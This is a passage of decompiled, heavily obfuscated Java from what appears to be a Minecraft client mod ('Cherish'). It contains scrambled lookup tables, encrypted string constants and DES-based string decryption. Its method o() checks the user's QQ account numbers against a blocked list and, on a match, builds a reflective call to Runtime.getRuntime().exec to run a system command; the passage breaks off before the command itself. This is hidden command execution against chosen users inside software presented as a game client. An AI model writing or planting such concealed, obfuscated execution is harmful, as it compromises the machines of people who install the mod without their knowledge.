               case 17 -> 13;
               case 18 -> 14;
               case 19 -> 32;
               case 20 -> 6;
               case 21 -> 56;
               case 22 -> 9;
               case 23 -> 55;
               case 24 -> 21;
               case 25 -> 43;
               case 26 -> 52;
               case 27 -> 36;
               case 28 -> 42;
               case 29 -> 53;
               case 30 -> 2;
               case 31 -> 61;
               case 32 -> 12;
               case 33 -> 59;
               case 34 -> 44;
               case 35 -> 33;
               case 36 -> 8;
               case 37 -> 27;
               case 38 -> 57;
               case 39 -> 34;
               case 40 -> 1;
               case 41 -> 54;
               case 42 -> 7;
               case 43 -> 58;
               case 44 -> 3;
               case 45 -> 47;
               case 46 -> 15;
               case 47 -> 17;
               case 48 -> 19;
               case 49 -> 11;
               case 50 -> 5;
               case 51 -> 29;
               case 52 -> 4;
               case 53 -> 40;
               case 54 -> 24;
               case 55 -> 62;
               case 56 -> 10;
               case 57 -> 23;
               case 58 -> 35;
               case 59 -> 18;
               case 60 -> 37;
               case 61 -> 25;
               case 62 -> 30;
               default -> 45;
            };
            int[] var7 = new int[6];

            for (int var8 = 0; var8 < 6; var8++) {
               int var9 = 7 * (5 - var8);
               int var10 = (int)(var0 >>> var9 & 127L);
               var10 -= var6;
               var10 += 128;
               var7[var8] = var10;
            }

            char[] var12 = ((String)var5).toCharArray();

            for (int var13 = 0; var13 < var12.length; var13++) {
               int var16 = var7[var13 % var7.length];
               var12[var13] = (char)(var12[var13] ^ var16);
            }

            i[var4] = new String(var12);
            return var4;
         }
      }
   }

   private static void a() {
      h[0] = "伾奄住\u0001\u001c)]Qb\u0002\u0016!ZSg\u0001\u001f)[Vd\u001d枸佪鸤";
      h[1] = void.class;
      i[1] = "java/lang/Void";
      h[2] = "!r\u0013y![.2^r+F+oU4\r\\'nTi&";
      h[3] = "oj1]\u000fNoj&\u0001\u0003Au!7\u0016\u0011Ht}&\u0016\u0011\tSj6\u001c\u0017Ubj\t\u001c\u0001Fuf*\u001d";
      h[4] = "$\u001f}g}\u0002+_0lw\u001f.\u0002;*叙厦伒桠桂栕叙桼伒厺";
      h[5] = "Gx\u0013\u00016\"H8^\n<?MeUL伌优佱佃佨伷厒桜可标";
      h[6] = "pTPr}Z{[A=\u0011YuYCr=";
      h[7] = boolean.class;
      i[7] = "java/lang/Boolean";
      h[8] = int.class;
      i[8] = "java/lang/Integer";
      h[9] = "<T`'o*.Y7oi1.R}'z6?Uulz3eIm`w+e\u007fkpk,\u001eHpe?\u001a*O|?/\u001b9Ei}";
      h[10] = "\ng[\u0000\u0014\u001e\u0001hJOi\u0006\u0012oC\u0006";
      h[11] = "o_yYY\u0006dPh\u00168\bo[lL";
      h[12] = "W>)CYNW>>\u001fUAM=2\u001fSB\u0017=2\u001fSBJ+4CXFW<(\fSB\u0017\u0012\u0010\u0002PnW=2";
      h[13] = "`h\u0016X+fo([S!{juP\u0015!\u007ffhL\u0015\u0001\u007ffhLv%gba]I";
      h[14] = "\u0007eupys\fjd?\u0014w\fvPt&j\bj`t";
      h[15] = "L{y-R0Gthb/%Unj!";
      h[16] = "\u000ecSegc\u0005lB*\u001dg\u0016mRe+c\u0001";
      h[17] = "mx\u0005\u0019_ifw\u0014V\u0003`au\u0016\u001b\u0005+Ap\u0016\u0014\u0015";
      h[18] = "\u000e_^wxF\u0005PO8\u0015F\u0005M[";
      h[19] = "%\u001c*t-1P<!{<~\f5&y>3\n~\u0006|><\u001ak";
      h[20] = "\u0019Sgp_s\u000b^08Yh\u000bUzpJo\u001aRr;Jj@台叕厕叠栐桿株佋厕栺";
      h[21] = "reHD\u0004n\u0007ECK\u0015!fKH@\u0011{\u0012";
      h[22] = "uA0k\bwz\u0001}`\u0002j\u007f\\v&\u0012l\u007fCm&\u0014pwK{zIK~Nzm\u0015MbFr{";
      h[23] = "\u001fzvGrLjZ}Hc\u0003\u000bTvCgY\u007f";
      h[24] = "iaEl]$f!\bgW9c|\u0003!_$nz\u0007j\u001c\u0006ek\u001ecW";
      h[25] = "C\u001f+\u0010\u0004^L_f\u001b\u000eCI\u0002m]\u0006^D\u0004i\u0016EXM\u0001i]\u0019TN\u0015`\u0001E栠栱伤佐伦伾叺栱厺佐";
      h[26] = "\u000bws0y\u0017\u00047>;s\n\u0001j5}`\u0019\u0004l8}\u007f\u0015\u0018us\u0011y\u0017\u0004|<=@\u0019\u0004l8";
      h[27] = "GiM\u0016\u0012HH)\u0000\u001d\u0018UMt\u000b[\bN\n双桲传厶佲可佒桲桤桬";
      h[28] = "LE4| %C\u0005yw*8FXr1\"%K^vza\u0007@Oos*\u0007NE{x*8";
      h[29] = "4\u0013PA!\u0000?\u001cA\u000e}\t8\u001eCC{B\u0013\u0017RH`\b";
      h[30] = "eGfL\u0000\u0000\u0010gmC\u0011OqifH\u0015\u0015\u0005";
      h[31] = "1//0tR>ob;~O;2i}m\\>4d}栊佨伇桐佔厘栊佨伇桐";
      h[32] = "\u00182#I@\r\u0017rnBJ\u0010\u0012/e\u0004B\r\u001f)aO\u0001\u000b\u0016,a\u0004]\u0007\u00158hX\u0001伷伮桍栜使佺桳桪桍佘";
      h[33] = "Iap\u000bHC<A{\u0004Y\f]Op\u000f]V)";
      h[34] = "l[fJY c\u001b+AS=fF \u0007U aS!N\u0018\f`[.@Q\u0002n[)NS=";
      h[35] = "i#jkRBfc'`X_c>,&HYc!7&^Ac(*|\u0013格叁优休佝栬佸栛历厏";
      h[36] = "\\b0F&1)B;I7~HL0B3$<";
      h[37] = "\u0015\u00142qbE\u001aT\u007fzhX\u001f\tt<x^\u001f\u0016o<~S\u0005\u000ey\u007f#栻厽桫栍佇栜使桧伯栍";
      h[38] = "yn\u0002fzu\fN\tik:m@\u0002bo`\u0019";
      h[39] = "\u00043Ot\u000f\u0015q\u0013D{\u001eZ\u001c\u0013Df\nO";
      h[40] = "^;_}WESz\\6P\u001eU F#WUO\"W!\nxI B\u0000ABK1@";
      h[41] = "hp\t61\u0018\u001dP\u00029 W|^\t2$\r\b";
      h[42] = "&:Mv~\b)z\u0000}t\u0015,'\u000b;d\u0013,8\u0010;b\u001e6 \u0006x?桶厎原伶栄叚伲桔桅伶";
      h[43] = "xE\u0003p\\v\re\b\u007fM9lk\u0003tIc\u0018";
      h[44] = "g\u007fO#(\rgi\u000fX+\u0017ulD";
      h[45] = long.class;
      i[45] = "java/lang/Long";
      h[46] = "c-\bp]L\u0016\r\u0003\u007fL\u0003w\u0003\btHY\u0003";
      h[47] = "~i\u000f%Ejq)B.OwttIh_qtkRhX`nhT4I`n)s#YjhuB#YH|i@!Ow";
      h[48] = "*dO?6y%$\u00024<d y\tr,b f\u0012r4\u007f:iO桍伌叝桘栛桰桍案佃伜";
      h[49] = "\u001cbvM%G\u0001tv@(R\u001bc=Onp\u001dl6M%_";
      h[50] = "upYr\u0005-hfY\u007f\b8rq\u0012pN\u001at~\u0019r\u00055Zj\u0003i\u0012<";
      h[51] = "4~fI7\u000e4~q\u0015;\u0001.}}\u0015=\u0002t}\u007f\u000bt*5\u007f^\u000e)\u0013";
      h[52] = "e\u0013_hB/{\u001bE'%.j\u0000H}\u0003(";
      h[53] = "pJ1\u001c\u000b\u0001nB+Si\u001di_";
      h[54] = "?~n\u001ci}!vtS\u0004g9s}\u001e3a:q";
      h[55] = "\u0013Mpu\u001ac\rEj:Rc\u0017Or}[xW|tqP\u007f\u001aMrq";
      h[56] = "\u0013j\u0007-#\u001a'I\bmn\u0011-T\r0eW%I\u00006a\u001cfk\u000b'x\u0015-\u001d";
      h[57] = ">>v2\u0018\u0013>>an\u0014\u001c$=mn\u0012\u001f~=mn\u0012\u001f#+k2\u0019\u001b><w}\u0012\u001f~\u0012Os\u0011<97gU\u001b\u001c?";
      h[58] = "h%\u000eBM,v-\u0014\r3+m4\u001dQ\u00170g7";
      h[59] = "\u001dP\u0004h\n\u0012\u0012\u0010Ic\u0000\u000f\u0017MB%\u0010\t\u0017RY%\b\u0014\r]\u0004\\\u0000\u001f+JCg\u0016";
      h[60] = "A\u0013c/^/_\u001by`#?_";
      h[61] = "/@b$G\u001a \u0000//M\u0007%]$i]\u0001%B?i]\u001b?O*\"\u0006 \"]-!M 8G 4";
      h[62] = "\u000eATC\u0015K{a_L\u0004\u0004\u001aoTG\u0000^n";
      h[63] = "L0p? _\u0001709?M[71=tO\\3p\u0012\tcc1?7?\\";
      h[64] = "0A\u001bsl\\?\u0001VxfA:\\]>vG:CF>qV=KPb-佦伆栾叾叛栒佦厘栾你";
      h[65] = "\u0017O\u001dV\u0001Lbo\u0016Y\u0010\u0003\u0003a\u001dR\u0014Yw";
      h[66] = "\nh\u0010{\u001e0\u0005(]p\u0014-\u0000uV6\u0004+\u0000jM6\u00013\b\u007f[j_\r\u0006r_l\u00180\u0007SJq\u001d,";
      h[67] = "=[\"|X%H{)sIj)u\"xM0]";
      h[68] = "?MEB_\u0000-@\u0012\nY\u001b-KXBJ\u001c<LP\tJ\u0019fcI\u000f@\u0017:";
      h[69] = "rZ^\u001cJ}yUOS-\u007fl^O\u0018\u0016";
      h[70] = "Y[W0&MGSM\u007f{LA_@<&kGHD0e";
      h[71] = byte.class;
      i[71] = "java/lang/Byte";
      h[72] = "\u0017\u0014>eq \u001c\u001b/*2-\u0013\u0014/a2)\u0013\u0001fI>\"\u001c\u0012-i:\"\t3)g+#\u000f\f";
      h[73] = "x\u0018@Zfis\u0017Q\u0015%d|\u0018Q^%`|\r\u0018i=kf\u0010[^\u0005]P\u001cWU";
      h[74] = "^ $SK\u0006Q`iXA\u001bT=b\u001eQ\u0000\u0013桟佟佥栵厢栬伛栛叻栵";
      h[75] = "L=\u001ex\u0018.^0I0\u001e5^;\u0003x\r2O<\u000b3\r7\u0015厞厬桇桽伉株厞伲厝桽";
      h[76] = "zg?*{M\u000fG4%j\u0002nI?.nX\u001a";
      h[77] = "%'R\u007f\u001f\u001b*g\u001ft\u0015\u0006/:\u00142\u0005\u0000/%\u000f2\u0003\r5=\u0019q^'?:\by\u001d!2 \u0010o";
      h[78] = "\fo";
      h[79] = " k|&IhUKw)X'4E|\"\\}@";
      h[80] = "\u0002e\u0010U[2wE\u001bZJ}\u0016K\u0010QN'b";
      h[81] = "5X\u001e>cU\u0001{\u0011~.^\u000bf\u0014#%\u0018\u0003{\u0019%!S@Y\u001248Z\u000b/";
      h[82] = "3\u0012&<1N6]\u00164sB";
      h[83] = "Q\u0002{H5M_]!Q\r^U\u001cESjIU\u001aaH`J8Y!K=LEZ\u007fF1X8";
      h[84] = "Mx\u0000nh/M\u007f\u000es\u000bP-,\u0007\"rvH{Uo;\u0012\u0014)\u001bhmuH`\u0003#\u000b";
      h[85] = "\n.-\n:\u0017\u0003x#\u0002\n\u0017\u001frh\r\n\r\u0000qm\u001co\u0000C~z`";
      h[86] = "I\u0006\bYj\bKV\u0019\fja\nR\u0006\u0000q\f1Qc^5\u000e\u001d@[\u001fr[K\\cZmQ\t[\u0006\r?\u001c@?";
      h[87] = "?@3d,\u007f3LpqG\u007f0]\u000b{+m9LNw&{ \u00117v?j$!.u\"l>\u001c.r,q]";
      h[88] = "\u0000m2\u0015?_\u0000j<\b\\0`=4\u0006-YP\u007fhP\"\u001c`";
      h[89] = "8\u000e~\u0007790\u000fm\u00118\u0000`Oo\u0010>|fI\u0002Soj>^|\u000e&pl\b\u0002";
      h[90] = "g,W\u0004<(nzY\f\f/wl\u0002\tj%{|\u0015n}8ri\u0015\u000bp{}~i";
      h[91] = "t\u0007:\u001a3\u001da\n4\u001eS\u0002\u0004Y*\f1Bb\u001d2\u0015b\r\u0004Yp\u0000)\u0019c\u00059\u0018b\u007f";
      h[92] = "Y.Wk$bX7Fo\u0014t_3p{\u007f\u007f[5QzZz_+P\u0016+{MuX}v`\n?<|euNtNh$tXO";
      h[93] = "o^_<TS{R\u000bc?P\n\b\\\u007fEVmT\u0015g\u000e0";
      h[94] = "\u0005\u0017==R_CB+bXc]N,&=Z\u0004V7<Z\u0006MN|Z";
      h[95] = "j=`\b|r2<q\u0003y\n0\r5\u0018qhnkq\u0000h;!\r5B}p5ji\u000be;S";
      h[96] = "nVD}X\u000bo[B'3\u0003\u0011\u001d\u001eiQ]wY\u0006p\u0002\u0012\u0011\u001e\u0017{J\u0012r\u001cAaA`";
      h[97] = "\u0019\u000eZUR\u001cC\fVAm伨口桫栯栽估伨口厱叵$V\u000eY\fJ^\b\u000bA\u0019";
      h[98] = "25O\\S\u0018h7CHl伬佖伔佾栴桵厲又桐佾-\u0013\u00033/HF\u0012\u000e5u";
      h[99] = "\u000e0y\u000f\u000b\u007f\u000e7w\u0012h#\u0015\u0014z\u001a\u0002&\u00035\u001cN\nr\u0017=y\u0019X?^Y";
      h[100] = ",NDvrRqU\u0003<\u0016BnD@0lXuA;r(Ul\u001f\u00073&@|.\u0004,i\u0003wEY7.I\u0013";
      h[101] = "\u0004x vaX^z,b^a=:rk!\u0000\u0001{|~11\u0004<2}8VXu*6^";
      h[102] = "\u000ekM@;\u0017\u0002yNAG:h#\u0004G=\u0003\u000f\u007fM_ve";
      h[103] = "},m\u0012t4m|ulTNQ\\Q-YWZU\\U+6.(*R!4.,\u0013\u0006/qiw(\u0016\u007fi";
      h[104] = ";6oP\u0017d(qqBw4$0H\\\u001b\u0015((`@wbp'3^\u001e` 6f^w";
      h[105] = "=ycYe\u000b<te\u0003\u000e\u0007B29Ml]$v!T?\u0012B2cAt\u0006%n*Y?`";
      h[106] = "YOz\\:@OC'Z\\\u0015%\u0010(\u0012>ECT0\u000bm\n%\u0010r\u001e&\u001eBL;\u0006mx";
      h[107] = "%\\\tR3\u0012$E\u0018V\u0003\u0005)G$Ff\u0006N\u0002\u0002P9\u000f%_\u0019\u0017sk%\\\tR3\u0012$E\u0018V\u0003";
      h[108] = "t_z\u001c)<6Q}K>]\"Xon69\u0014l\u0013\u001eo! U*\u0016n26Z\u0013";
      h[109] = "6Qv\u0013,\"k\u0013zKwH`\u000063 $tmsO,vj\u0004q\u001f=#jm";
      h[110] = "r5\b\u0019t'(7\u0004\rK桗厈伔伹伵桒伓厈桐伹hz+v*\u000b\u0010{$q+";
      h[111] = "i\r\fR`#}L\rD[>n\u0000b\u001ek79\u0012\u001fG`23|R\u001e=km\u0001\u000b\u00158a\u0003";
      h[112] = "G\u0005<&s+\u0016\u0018*lI$\u001c\u001b$0 (%\u0015$ $NF\u001ep$-+\u0011L=mI";
      h[113] = "$0(w7m*orn\u000f~ .\u0016lhi (2g\u000f.--trds6j>\u00160q2h*}mju\"N";
      h[114] = "h\u00101\u0005]\u000fkN<\tIr>A/mZ\u0015)A)IQrnL,\u000fD\u00193WkE M1SiQK\u0010*\u0014#5";
      h[115] = "@l5\u0010.6N6!\u001bL.-d=\u000e.oK %\u0017} -mo\u001av<P4d\u001f|R";
      h[116] = "\u000f:\u001c[BP\u001fj\u0004%吚乵芜\u0005]EYQ\u0001n\u0000^\u001e\u001be:\u0002Z\u001c\u000f\u000eg\u0019\u001dVkZe\u001d\u001fB\u0000\u0007~ZU&";
      h[117] = "\u0011-\u0012\u0006Q\u001cK/\u001e\u0012n厶叫伌伣桮桷伨叫案桧wT\u001eH(\f\u0014VHR#";
      h[118] = "i&\t\b\u0014F9#SZu佤佔伅栯桸厶佤佔桁佫a\u0014\u0003k`\r\u0018\u0013U9c";
      h[119] = "[e6R\u0012=Y5'\u0007\u0012T\u000b01lGd\u0004f3\u0011\u001eo\u0001l]Q\u0015d\u001b88\u0006G)R\\";
      h[120] = "\u0017!\u001a7I(\u0015q\u000bbIAUd\u000bdE$.!\u001aj]8\u0015z\u00110T?.";
      h[121] = "&R8S@x{I\u007f\u0019$rb\u007f\"\u0011Xb\u0019\u000f%Y]w|Xw\u0014\u0014\u0013";
      h[122] = "\u001eI\u0010\u0007\u0001\n\u001eD\u0006L\u00114HH\u001dd\u0003R[D\u0004S;dmH\bX~\rI\u0014Q\\\f\u000bA[\u0005C~";
      h[123] = "MkXD?-Ld_EP/\u0011a\u0004\\,8\u0006\u000eU\u00176o\u0012s\f\u001c3e|7]Y*3\u001bk\u0014AaU";
      h[124] = "\u0003Z\u0017v(DYX\u001bb\u0017佰佧佻桢栞叔佰栣佻伦\u0007-FZ_\td/\u0010@T";
      h[125] = ",E38\u000bq%\u0013=0;t9\u0003v2;kf@gbPb0NoR";
      h[126] = "+5\"\u001f\rG+2,\u0002n$Ke$\f\u001fA{'xZ\u0010\u0004Ke\u007f\u001d\u0014\u001c,96\u0005_z";
      h[127] = " /ks Z}4,9D\\f2}-?pp)s3)zv4yI{Q`up\"&J'?\u0014t&\u0001f+q#tL/O";
      h[128] = ">}G=)l8(U8/\u0016A\u0013\f&7t:uH>.'u\u0013\f|;latP5#'\u0007";
      h[129] = "\u000eBw5\t0T@{!6伄佪叽变厇佫桀叴栧变D\u000b;\u0007G\u007f!\\iJ\u000e";
      h[130] = "vc+I1B,a']\u000e叨伒叜厄叻栗栲伒佂桞8lJ2g,W`Fqr";
      h[131] = ">VE`P\u001aoKS*j\u0001kKDv-\u0011\u0002\u0012[+\u0013\u001bgE\tfZ\u007f>VE`P\u001aoKS*j";
      h[132] = "{noJ=Eg,|\u0010\u0003Z\u001c)f]a\u0016zm~D2Y\u001c)<QyM{uuI2+";
      h[133] = "e\\Oz2\rcK\u0011sX\u0018\u001d\u0017Ls:B{STji\r\u001d\u0017\u0016\u007f\"\u0019zK_gi\u007f";
      h[134] = "$!E4!\u00187f[&AH;''-;E=;\u0018>|[/[";
      h[135] = "Es[n\u00143\u0018h\u001c$p9\u001c\u007fI$76z,D+J<\u0011q_l\u0000XD-H+Ad\u0005#];p";
      h[136] = "\u0016PS\u0016\"o\u0014\u0000BC\"\u0006U\u0004]O9kf\r\\(~?KSBE,\u007fH\u0015\\(zd\u001f\u0010\\M-6RY8";
      h[137] = "\u001bU7pZg\u001d]x$E\u0015MVz\u0001^m_GO:WhGV`<C\u0015\u001b\u0002m~]|\u0019R|+]\u0015";
      h[138] = "H3X(L\u000e\u00121T<s?qv\f'\t\u0001\u0016*E?Bg";
      h[139] = "AE<\bw\u0013\u001c^{B\u0013\u0006\u0017A>_T\u0016~\u0015sT)\u0016\u0003LxQ#xAE<\bw\u0013\u001c^{B\u0013";
      h[140] = "\t\t\u001accDT\u0012])\u0007BO\u0014\f=|/\u0006Y\u0003ciR_R\u0006i\u0007\u0012TY\u001c=bE\u0006\u0014UY";
      h[141] = "\u0018a\u001f\u0019+g\u0007:Y\u001e\u0010\u0005v>\u0004Vrf\u0010z\u001cO!)v>^Zj=\u0011b\u0017B![";
      h[142] = "z\b,&4I|Tis\u000b\fj\u000bv1P\by\u0001s\u0011q\u001d{\u0007\u0010t3\nj\fw(z\u0012!j";
      h[143] = "\u001eVH'_I@S\u001fs\u001f5H\u0006[\u0017QUXQC|\fN\u001f\u001b'(\u000eJ\u001d\u000fLu\u0015\rWk";
      h[144] = "B\u000eA\u00185z\u0011QV\u001f\tb \b\u0010\rsxGTY\u00158\u001e";
      h[145] = "\r\u001e-'*}\u0003Aw>\u0012l\u0014\u001d7F,?\b\u0003zzm1\u001d\u0013K\u007f*\u007f\u001e\u001a,#cgU|";
      h[146] = "\u0007\u0015\u0007>kI\u0013T\u0006(P@\u0000\u0018ir`]W\n\u0014+kX]dYr6\u0001\u0003\u0019\u0000y3\u000bm]Q<*]\n\u0001\u0018$a;";
      h[147] = "\u0016\u000b6lf E\u000473\u000bq\u0013\u001f?lf\u0010EQ>5em\u001cZ;?\u000b)\u0017\u0013:2mm\u000f\ni}\u000b E\u0007bavyN\u0002h\u000f";
      h[148] = "j\u0017R\u000e\u001ay0\u0015^\u001a%栉桊桲叽桦格栉厐伶佣\u007f\u001f{3\u0012L\u001c\u001d-)\u0019";
      h[149] = "&d\u0016\u0010)6d8\u001e\u0007j\tq \u0017\u0006Qdz=\u0000\u001a\u00140'$\u0000\rsln<Kk";
      h[150] = "\nn\u001fu0\u001a\u00044\u000b~R3gf\u0017k0C\u0001\"\u000frc\fg2Ds>\u001c\u0003<\u001eg5~";
      h[151] = "T)[\u0011}\u0014\u0011wXQqn\u0002 \u0019)x\u0015\n)\u0018\u001c\u007f6\u00041\u0005`-\u000e\u0012w\u0001\u000bp\u0015U=e";
      h[152] = "'\u0000{wJ0&\u0019jsz&!\u001d\\g\u0011-%\u001b}f4(!\u0005|qz%}Zyu\u0004%w_|\n";
      h[153] = "g=T[B9=?XO}\u0010^x\u0000T\u000769$ILLP";
      h[154] = "s)7MbW\"6:\u0016\u001cJ.(\u0000\u001bpd/Tz\u001cc\u001f'?'\u0007$UC";
      h[155] = "\u0012\b)$\u0000mK\u0003,.nlEc3d\u000fvM8p~\u0011*FS-eV`\"";
      h[156] = "\u001d\u001e=aw?\u000eY#s\u0017o\u0002\u0018\u001am{{o]fa)e\u0006_6p|eo";
      h[157] = "?XiK<[8T:\u0012B\u00199Ozs|\\)W3O=R<G\u0002Jz\u001c?Ne\u00163\u0004t(";
      h[158] = "?\nT\\!6?\u001a\u0001\\)\u000bg\u0005\\]L2>\u001dGG+nw\u0005\f!";
      h[159] = ";m-p\tX-apvo\u0010G2\u007f>\r]!vg'^\u0012G2%2\u0015\u0006 nl*^`";
      h[160] = "o=*X\u001c8o,+\u0004s6<=(\u0018\u000b&Qi2\u0016I>:4)Q\u0003Zn6-S\u001713-j\u0019s";
      h[161] = "\u0002\u0019&\u0012!QX\u001b*\u0006\u001eQ;\u000f(_u\u0007\u0006\tt\u001a 8Q\u0007v\b!\u0005W[3]\u001e";
      h[162] = "W\u001ayRZ]UJh\u0007Z4\u000f_\u007f\u0016VH\tY\u0012U\u0007^QNl\bND\u0003\u0018\u0012";
      h[163] = "G\u00131\b\r@\u001d\u0011=\u001c2佴厽桶伀桠佯佴伣厬桄yBN\f\u000b=\u001bWC\u0002\u000f";
      h[164] = "\u0012\u0019N<i\fY\u0002P7`aU\u001a[!4&Es\u0001b5\u001e\u001aO@l \u000e+JU-9QF\u0001N32X+";
      h[165] = "\u001b1\u0006X86\u000fp\u0007N\u0003+\u001c<4U{)q+\tO~t\b*\u0010^zD";
      h[166] = "@Zr\u0004^V\u001bQ(\rYm\u0010W`0N\u0011\u0012Q\u0011L\u001d\u0002\u0014N)\rZWBR\u0011HE]\u0000Ut\u001f\u0017\u0010I1";
      h[167] = "+zm\u0005$_?;l\u0013\u001fV,wJ\u0012t@:pb\u0013{@A6aIfI$a3\u0004/-x3}\u0003yJ$zeH\u001f";
      h[168] = "XyX\u0004-:\u0002{T\u0010\u0012*a;\n\u0019mb]z\u0004\f}S";
      h[169] = "bu\u000f*k\u000enyL?\u0000&\u0000-J,z\u0007gq\u000341a";
      h[170] = "9'\u001e\u0013[m)w\u0006m[Vj \u001e\u0017Y16i\u0006\\?";
      h[171] = "\r\u0013\u0019B\u0001\u000fW\u0011\u0015V>厥栭伲伨株佣桿栭伲桬3\\Y]\u0004IW\u000f\u0006J\u0003";
      h[172] = "\f\u0013Xb4JOE\u0006'\tR\u001c\bx3lN\u000b\u0005= d@\b\u0013\u00031`IAtC3`P\u0016JR7i\u0019qMQ>j\u0014\u001a\u000bS5y\u0010qM\u0005 sO\u0016\u0011L88)";
      h[173] = "\u0000dOOj\u001a\u0000x\u0018B\u007fuu\n\u0018\u0011h\u000f_mDXpD9";
      h[174] = "r/+\u001aZ\u0012dh\"\u001d:\u001f{*\u0017\u0010^\r{VyI\\Jx+ BY@\u0016";
      h[175] = "\u001c<\u0006\u0012lt\u0010.\u0005\u0013\u0010vztO\u0015j`\u001d(\u0006\r!\u0006";
      h[176] = "ygY\u0003\u0012`#eU\u0017-w@\"\r\fWo'~D\u0014\u001c\t";
      h[177] = "T\u0016 v4V\t_:$b(\rG1\u000f4X\u0011.w+iQ\tK y$\u0018m";
      h[178] = "\u001c(Q\u001f5TA3\u0016UQTD.RL0YXHG\u0014-YI1D\u0019,Z#uL\u0015([F\"\u001eXa?";
      h[179] = "F_I@\b_\u001c]ET7M\u0012_`PQ[\u0014YL_K6F\u001b[KQQ\u001aRC\u00007";
      h[180] = "`eY\u001cv\u0000=,CN ~?0C_\u001bNi;\tMf\u0017b>\u0003#";
      h[181] = "\fvOr<l\ro^v\fz\nkhbgq\u000emIcIx\u001bwCc\f*\u0007h\u001ekgw\u001c/T\u000fv\u007f\u0003i\u00185}.\u0004|$lf{\u0004z\u0014?iz[\u0017";
      h[182] = "I{%4],\u0013y) b\u0004p>q;\u0018#\u0017b8#SE";
      h[183] = "y?h\u001ft}#=d\u000bK栍桙厀叇桷厈受伝伞余n-e1:x\u001c!w2;";
      h[184] = "&DI\\\u001c\u001b S\u0017Uv\u0004^\u000fJU\u0014T8KRLG\u001b^\u000f\u0010Y\f\u000f9SYAGi";
      h[185] = "\u00191}g(|C3qs\u0017U s/zh$\u001c2!ox\u0015";
      h[186] = "\u007fH}\u000b\u0013\u007f<\u001e#N.rxBurCyeUi7PqkV\u007f\tAub\u001f\u0018\u000e\u0016bxI\u007fR_z3/";
      h[187] = "w&!\u0001p\u00120)=\u00053w/=\u0018\u0010w\t/-.0}\u00165:CBm\bt\"(\u001fvO>F~\u001f=\u000e*#)MpGN";
      h[188] = "qN*`3;,Um*W,)e53-\u00194T<+Wi/I26).~\u00150bW";
      h[189] = "H*O7\u0001\u001d\u0012(C#>伩伬伋栺桟叽厷桨桏佾F\u0004\u000f\u0003=\u001c$P\u0013L2";
      h[190] = "~*D>\u0004#<$Ci\u0013B&&Ly\u007f{%2O8\u0019?=+\u001cw\u007f{\u007f>Wc\u0018'6&\u001c\u0005";
   }

   private static Field a(Class var0, String var1, Class var2) {
      for (Field var6 : var0.getDeclaredFields()) {
         if (var6.getName().equals(var1) && var6.getType() == var2) {
            return var6;
         }
      }

      return null;
   }

   private static String a(int var0, long var1) {
      int var5 = var0 ^ (int)(var1 & 32767L) ^ 1556;
      if (c[var5] == null) {
         Object[] var4;
         try {
            Long var3 = Thread.currentThread().getId();
            Object[] var10000 = (Object[])d.get(var3);
            var4 = new Object[]{Cipher.getInstance("DES/CBC/PKCS5Padding"), SecretKeyFactory.getInstance("DES"), new IvParameterSpec(new byte[8])};
            d.put(var3, var4);
         } catch (Exception var10) {
            throw new RuntimeException("cn/cool/cherish/Cherish", var10);
         }

         byte[] var6 = new byte[8];
         var6[0] = (byte)(var1 >>> 56);

         for (int var7 = 1; var7 < 8; var7++) {
            var6[var7] = (byte)(var1 << var7 * 8 >>> 56);
         }

         DESKeySpec var11 = new DESKeySpec(var6);
         SecretKey var8 = ((SecretKeyFactory)var4[1]).generateSecret(var11);
         ((Cipher)var4[0]).init(2, var8, (IvParameterSpec)var4[2]);
         byte[] var9 = ((Object[])"[áÏ4\u0014ù\u0091\u0000t, çO<\u001a*¸\u0092\u009c\u0019@\u0014å³0¨\u0005, \u0013Êûú\u0014 èE\u000e\u009ds^\u0000ÜâY, Ó:Ú_®ä\u009bdçÒÛÉøa\u0094/l\u0099=£\u0089NF¼_Ü<\u0091\"aý¦\\")[var5]
            .getBytes("ISO-8859-1");
         c[var5] = a(((Cipher)var4[0]).doFinal(var9));
      }

      return c[var5];
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, MethodType var3, Object[] var4) {
      int var5 = var4.length - 2;
      long var6 = (Long)var4[var5];
      long var9 = (Long)var4[++var5];
      MethodHandle var8 = a(var0, var1, var2, var3, var6, var9);
      var1.setTarget(MethodHandles.explicitCastArguments(var8, var3));
      return (Object)var8.asSpreader(Object[].class, var4.length).invoke(var4);
   }

   private static CallSite a(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/Cherish" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   public 树何友树树树树树何何 m() {
      return this.何友树何树何何何友树;
   }

   public ResourceLocation m() {
      return this.树树树友树树树友何何;
   }

   public void o() {
      c<"Ñ">(5166887910505931613L, 12898248509338L);
      if (!树何友友友友友树友友) {
         树何友友友友友树友友 = true;
         if (Fucker.树树何树何何树友何树 != null && c<"d">((Boolean)Fucker.isLogin, 5153822909642588012L, 12898248509338L)) {
            try {
               c<"Ñ">("", 5152355039508702011L, 12898248509338L);
               c<"Ñ">("net.minecraftforge.versions.forge.ForgeVersion", 5152355039508702011L, 12898248509338L);
               Iterator e = c<"d">(c<"Ñ">(5152440569472237553L, 12898248509338L), 5155582601850696079L, 12898248509338L);
               if (c<"d">(e, 5167457735653508303L, 12898248509338L)) {
                  String qq = (String)c<"d">(e, 5167603754531806863L, 12898248509338L);
                  if (c<"d">(c<"d">(BLOCKED_QQ_NUMBERS, 5153286039365786309L, 12898248509338L), (Predicate<Object>)s -> {
                     H();
                     return qq.indexOf((String)s) > -1;
                  }, 5166670833103821038L, 12898248509338L)) {
                     c<"Ñ">(5167781820454180253L, 12898248509338L);
                     c<"d">(
                        c<"d">(
                           c<"d">(
                                 c<"d">(
                                    c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                                    "getRuntime",
                                    new Class[0],
                                    5167707563198487499L,
                                    12898248509338L
                                 ),
                                 c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                                 new Object[0],
                                 5169828374985638200L,
                                 12898248509338L
                              )
                              .getClass(),
                           "exec",
                           new Class[]{String.class},
                           5167707563198487499L,
                           12898248509338L
                        ),
                        c<"d">(
                           c<"d">(
                              c<"Ñ">("java.lang.Runtime", 5152355039508702011L, 12898248509338L),
                              "getRuntime",
                              new Class[0],
                              5167707563198487499L,
                              12898248509338L
                           ),
